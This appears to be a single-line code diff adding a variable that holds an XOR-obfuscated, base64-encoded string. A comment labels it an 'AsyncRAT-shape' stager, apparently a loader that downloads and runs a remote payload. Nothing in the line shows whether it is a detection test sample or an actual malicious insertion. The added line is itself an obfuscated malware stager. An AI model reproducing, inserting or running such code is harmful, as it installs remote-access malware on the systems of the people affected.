@@ -1,0 +1,1 @@
+$p='IgkRCAoJBwInCAIvCBAJDQNGDhISFlxJSQcVHwgFFAcSS1NIAx4HCxYKA0gSAxUSSQQDBwUJCEgEDwg='; # xor-key 0x66  # AsyncRAT-shape stager
